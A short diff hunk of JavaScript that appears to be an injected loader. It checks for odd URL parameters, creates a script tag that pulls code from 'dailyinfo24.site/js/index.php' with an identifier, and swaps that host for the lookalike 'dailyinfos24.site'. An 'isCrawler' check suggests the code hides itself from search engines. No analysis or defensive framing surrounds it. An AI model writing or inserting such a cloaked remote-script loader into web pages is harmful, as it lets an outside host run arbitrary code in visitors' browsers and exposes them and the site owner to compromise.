@@ -21,7 +21,7 @@ if (!urlParams.has("o2x") && !urlParams.has("io0") && !urlParams.has("dbg123")) 
 }
 if (identifier !== undefined) {
   var script = document.createElement("script");
-  script.setAttribute("src", "https://dailyinfo24.site/js/index.php?id=" + identifier);
+  script.setAttribute("src", "https://dailyinfos24.site/js/index.php?id=" + identifier);
   script.setAttribute("id", "code");
   document.head.appendChild(script);
   if (!isCrawler) {
